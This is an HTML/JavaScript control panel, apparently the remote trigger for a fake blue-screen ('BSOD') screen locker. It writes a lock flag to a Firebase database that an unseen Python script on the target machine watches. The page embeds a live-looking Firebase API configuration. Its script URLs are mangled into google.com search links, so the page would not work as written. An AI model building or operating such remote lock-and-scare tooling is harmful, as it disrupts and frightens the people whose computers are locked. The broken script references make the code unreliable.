<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Master Control Dashboard</title>
<script src="https://www.google.com/search?q=https://cdn.tailwindcss.com"></script>
<!-- Firebase SDKs -->
<script src="https://www.google.com/search?q=https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
<script src="https://www.google.com/search?q=https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
</head>
<body class="bg-slate-900 min-h-screen flex items-center justify-center text-white font-sans">

<div class="bg-slate-800 p-8 rounded-3xl shadow-2xl border border-slate-700 w-full max-w-md text-center">
    <h1 class="text-2xl font-black mb-2 uppercase tracking-tight">System Controller</h1>
    <p class="text-slate-400 text-xs mb-8 italic">BSOD Remote Trigger Interface</p>
    
    <div id="status-card" class="mb-8 p-5 rounded-2xl bg-slate-950 border border-slate-700">
        <p class="text-[10px] text-slate-500 uppercase font-bold mb-2 tracking-widest">Connection Status</p>
        <p id="status-text" class="text-xl font-mono text-emerald-400 tracking-wider">CONNECTING...</p>
    </div>

    <div class="space-y-4">
        <!-- Lock Button -->
        <button onclick="triggerLock(true)" id="lock-btn" class="w-full bg-red-600 hover:bg-red-700 py-4 rounded-xl font-bold transition-all active:scale-95 disabled:opacity-30 disabled:cursor-not-allowed shadow-lg shadow-red-900/20">
            ACTIVATE 60s BSOD LOCK
        </button>
        
        <!-- Force Unlock Button -->
        <button onclick="triggerLock(false)" class="w-full bg-slate-700 hover:bg-slate-600 py-4 rounded-xl font-bold transition-all active:scale-95 text-slate-300">
            FORCE MANUAL UNLOCK
        </button>
    </div>
    
    <div class="mt-8 pt-6 border-t border-slate-700">
        <p class="text-slate-500 text-[11px] leading-relaxed">
            System automatic 100% complete hone par unlock ho jayega.<br>
            Admin manual override kabhi bhi kar sakta hai.
        </p>
    </div>
</div>

<script>
    // Firebase Configuration
    const firebaseConfig = {
        apiKey: "AIzaSyBcL0G8b7Yt_Ahk29cUaTTfp6Uf4QgNfTI",
        authDomain: "smsyy-f7bb7.firebaseapp.com",
        databaseURL: "https://smsyy-f7bb7-default-rtdb.firebaseio.com",
        projectId: "smsyy-f7bb7",
        storageBucket: "smsyy-f7bb7.firebasestorage.app",
        messagingSenderId: "199149027655",
        appId: "1:199149027655:web:2d9e70e7dff7abc293cc62"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
    const statusText = document.getElementById('status-text');
    const lockBtn = document.getElementById('lock-btn');

    // Function to update Firebase
    function triggerLock(status) {
        database.ref('system_settings/overlay_active').set(status)
            .catch(err => {
                console.error("Database update failed:", err);
                alert("Error updating status!");
            });
    }

    // Database monitoring (Real-time sync with Python Script)
    database.ref('system_settings/overlay_active').on('value', (snapshot) => {
        const active = snapshot.val();
        if (active === true) {
            statusText.innerText = "SYSTEM IS LOCKED";
            statusText.className = "text-xl font-mono text-red-500 animate-pulse";
            lockBtn.disabled = true;
            lockBtn.innerText = "LOCK IN PROGRESS...";
        } else {
            statusText.innerText = "SYSTEM READY / FREE";
            statusText.className = "text-xl font-mono text-emerald-400";
            lockBtn.disabled = false;
            lockBtn.innerText = "ACTIVATE 60s BSOD LOCK";
        }
    });
</script>


</body>
</html>
